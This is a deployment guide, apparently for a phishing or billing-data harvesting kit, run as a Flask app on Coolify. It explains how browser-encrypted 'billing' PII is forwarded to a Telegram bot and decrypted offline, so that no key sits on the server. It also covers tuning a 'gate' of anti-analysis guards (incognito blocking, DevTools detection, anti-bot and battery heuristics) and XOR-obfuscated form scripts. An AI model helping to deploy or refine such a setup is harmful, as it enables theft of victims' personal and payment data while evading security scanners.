# Coolify deploy (single app, no docker-compose)

This project can run on Coolify as a single Dockerized Flask/Gunicorn app.

## 1) Create Application in Coolify

- **Source:** GitHub repository
- **Branch:** `main` (single production branch)
- **Build Pack:** Dockerfile
- **Dockerfile path:** `./Dockerfile`
- **Port:** `5000`

## 2) Environment Variables (minimum)

Set these in Coolify -> Application -> **Environment Variables** (Runtime):

- `FLASK_SECRET_KEY` = long random string (**required** — shared across all Gunicorn workers)
- `HANDOFF_SECRET` = long random string (**required** — shared across all Gunicorn workers)
- `COOKIE_SECURE` = `1`
- `STRICT_ORIGIN` = `1` (recommended when behind single domain)
- `GATE_HMAC_SECRET` = **leave empty** (multi-worker Gunicorn; a per-worker auto secret breaks `/start` → `/p`)

Optional (if used):

- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_CHAT_ID`
- `TELEGRAM_THREAD_ID`
- `ACTIVE_THEME` = `default` or `post_payment`
- `BILLING_PII_FORWARD_ONLY` = `1`
- `INCOGNITO_BLOCK`, `GUARD_DEVTOOLS`, `REMOTE_ANTIBOT`, etc. — same as `.env.example` (guard protections unchanged)

**Coolify env notes:**
- Use **Runtime** environment variables (not Build-only) so Gunicorn sees them.
- After changing any variable, click **Save** then **Redeploy**.
- Coolify injects these into the container as process env — no `.env` file is required inside Docker.
- On startup, logs show: `Billing UI theme: post_payment (ACTIVE_THEME env='post_payment')`.
- If the gate spinner on `/start` never finishes, check logs for `bad_sig` / `bad_csrf` and confirm `FLASK_SECRET_KEY` + `HANDOFF_SECRET` are set (not placeholders).

## Troubleshooting gate / register (bug fixes only — guard rules stay active)

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| `/start` → `Unable to continue` | Multi-worker + `GATE_HMAC` auto-secret per worker, or missing `FLASK_SECRET_KEY` | Redeploy latest `main`; set shared secrets; leave `GATE_HMAC_SECRET` empty |
| `Unable to continue (bad_origin)` on phone | In-app browser omits `Origin` header | Redeploy (Sec-Fetch-Site fallback added); or `STRICT_ORIGIN=0` |
| `Unable to continue (bad_csrf)` | Session cookie not shared across workers | Set `FLASK_SECRET_KEY` + `HANDOFF_SECRET` in Coolify |
| `battery_anomaly` on MacBook/laptop | False positive (desktop heuristic) | Redeploy (laptop detection fix); still blocks real desktop bots |
| Form submit does nothing | XOR scripts failed to load | Pass gate first; refresh billing page |

Debug dashboard: `/start?test=1234` (change `START_DEBUG_SECRET` in production).

## 3) Domain + SSL

- Add your application domain in Coolify (for example `app.example.com`)
- Enable HTTPS/SSL in Coolify for that domain

## 4) Keys for encrypted PII (important)

Browser encrypts registration PII with `frontend/static/keys/public.pem`.

**Recommended for Coolify (no private key on the web server):**

- Set `BILLING_PII_FORWARD_ONLY=1` in Environment Variables.
- Do **not** mount `private_demo.pem` on the app container.
- Telegram receives the same `encrypted_pii` envelope from the browser.
- Decrypt offline: `python tools/decrypt_telegram_pii.py '1.…'` with `keys_only/private_demo.pem`.

**Legacy mode (private key on server):**

- Mount `/app/keys_only/private_demo.pem` (matching `public.pem` in the image).
- Leave `BILLING_PII_FORWARD_ONLY` empty.
- If private key is missing or mismatched, registration returns `bad_encrypted_pii`.

## 5) Update flow

- Push code to GitHub
- In Coolify: click **Deploy** (or enable auto-deploy webhook)

